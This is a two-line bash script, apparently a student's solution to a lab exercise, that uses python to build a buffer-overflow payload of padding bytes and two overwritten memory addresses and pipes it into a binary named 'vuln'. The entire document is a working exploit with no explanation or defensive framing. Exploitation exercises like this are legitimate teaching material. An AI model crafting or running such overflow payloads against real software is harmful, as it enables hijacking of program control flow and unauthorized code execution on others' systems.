#!/usr/bin/env bash
echo -en $(python3 -c "print('a'*407 +r'\\xe4\\x88\\xff\\x43' + 'a'*408+r'\\x30\\xb3\\xe5\\xe0' + 'aaaaa')") | /task1/s2450797/vuln
